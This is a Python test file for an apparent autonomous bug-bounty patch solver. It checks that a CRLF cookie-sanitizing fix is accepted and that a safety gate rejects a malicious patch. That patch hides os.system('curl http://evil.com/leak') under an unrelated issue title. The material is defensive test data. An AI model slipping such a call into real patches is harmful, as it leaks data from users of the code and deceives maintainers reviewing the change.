"""
Test Suite: Autonomous Bounty Solver & PR Attestation Engine
============================================================
Tests:
  1. Automated resolution of a real bug (CRLF header injection).
  2. AST safety gating on malicious patches.
  3. Ed25519 signed PR dossier generation.
"""

import sys
import os
import json

sys.path.insert(0, os.path.abspath("."))
from src.autonomous_bounty_solver import AutonomousBountySolver

def test_bounty_solver():
    print("=" * 80)
    print("TESTING AUTONOMOUS BOUNTY SOLVER & PR ATTESTATION ENGINE")
    print("=" * 80 + "\n")

    solver = AutonomousBountySolver()

    # Test 1: Real Bug Fix (CRLF Cookie Sanitizer)
    failing_code = "def parse_cookie(raw): return raw.split(';')"
    fixed_code = """
def parse_cookie(raw: str) -> dict:
    sanitized = raw.replace('\\r', '').replace('\\n', '').strip()
    parts = [p.strip() for p in sanitized.split(';') if '=' in p]
    return {p.split('=', 1)[0]: p.split('=', 1)[1] for p in parts}
"""
    res1 = solver.resolve_bounty(
        bounty_id="BOUNTY_URLLIB3_01",
        target_repo="urllib3/urllib3",
        issue_title="Unstripped CR-LF control sequence in cookie parser",
        failing_code=failing_code,
        fixed_code=fixed_code
    )

    print(f"[TEST 1: Legitimate Bug Fix Resolution]")
    print(f"  * Bounty ID      : {res1['bounty_id']}")
    print(f"  * Status         : {res1['status']}")
    print(f"  * Verdict        : {res1['btp_receipt']['verdict']}")
    print(f"  * Gate Latency   : {res1['btp_receipt']['latency_us']} µs")
    print(f"  * Ed25519 Sig    : {res1['btp_receipt']['signature'][:32]}...")
    assert res1["resolved"] is True
    assert res1["btp_receipt"]["verdict"] == "ALLOW"

    # Test 2: Malicious Patch (Contains hidden os.system call)
    malicious_patch = """
import os
def parse_cookie(raw):
    os.system('curl http://evil.com/leak')
    return {}
"""
    res2 = solver.resolve_bounty(
        bounty_id="BOUNTY_EXPLOIT_02",
        target_repo="google/tink",
        issue_title="Streaming AEAD buffer fix",
        failing_code="",
        fixed_code=malicious_patch
    )

    print(f"\n[TEST 2: Malicious Patch Interception]")
    print(f"  * Bounty ID      : {res2['bounty_id']}")
    print(f"  * Status         : {res2['status']}")
    print(f"  * Reason         : {res2['reason']}")
    assert res2["resolved"] is False
    assert "REJECTED_BY_AST_GATE" in res2["status"]

    print("\n" + "=" * 80)
    print("ALL AUTONOMOUS BOUNTY SOLVER TESTS PASSED 100% CLEAN!")
    print("=" * 80)

if __name__ == "__main__":
    test_bounty_solver()
